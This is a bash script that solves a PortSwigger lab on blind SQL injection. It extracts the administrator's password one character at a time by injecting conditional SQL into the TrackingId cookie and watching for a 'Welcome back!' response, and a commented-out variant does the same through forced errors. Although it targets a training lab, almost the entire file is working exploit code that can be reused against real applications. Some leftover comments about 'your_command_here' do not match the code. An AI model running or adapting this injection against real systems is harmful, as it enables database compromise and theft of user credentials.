#!/bin/bash
# LAB LINK: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Initializing variables
# FOR ERROR BASED ( change the operator from = to < for binary search function )
# result=$(curl -H "Cookie: TrackingId=5mNbjnYJAS0u22m' || (SELECT CASE WHEN (SUBSTR(password,$pos,1)='$value') THEN TO_CHAR(1/0) ELSE 'b' END FROM users WHERE username='administrator') --" -s https://0a4d0026035dd6cc81c8e3b500f60065.web-security-academy.net/login | grep -q 'Internal Server Error' && echo '1' || echo '0')

pos=1
password=''
characters=( {0..9} {a..z}  )

# Binary search function to find the appropriate character
binary_search() {
    local low=0
    local high=$((${#characters[@]} - 1))
    local mid

    while ((low <= high)); do
        
        mid=$((low + (high - low) / 2))
        value="${characters[mid]}"

        result=$(curl -H "Cookie: TrackingId=5mNbjnYJAS0u22m' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),$pos,1) < '$value" -s https://0a0a00ba04de72d58197251e001e00bc.web-security-academy.net/login | grep -q 'Welcome back!' && echo '1' || echo '0')  # Replace "your_command_here" with the command you want to execute

        if [[ "$result" == '1' ]]; then
            high=$((mid - 1))
        else
            low=$((mid + 1))
        fi
    done
    ((low--))
    echo "${characters[low]}"
}

# Loop through the array using binary search
while true; do
    value=$(binary_search)
    result=$(curl -H "Cookie: TrackingId=5mNbjnYJAS0u22m' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),$pos,1) = '$value" -s https://0a0a00ba04de72d58197251e001e00bc.web-security-academy.net/login | grep -q 'Welcome back!' && echo '1' || echo '0')  # Replace "your_command_here" with the command you want to execute

    if [[ "$result" == '1' ]]; then
        ((pos++))
        password+="$value"
        echo "Found: $value"
    else
        break
    fi
done

echo "password: $password"
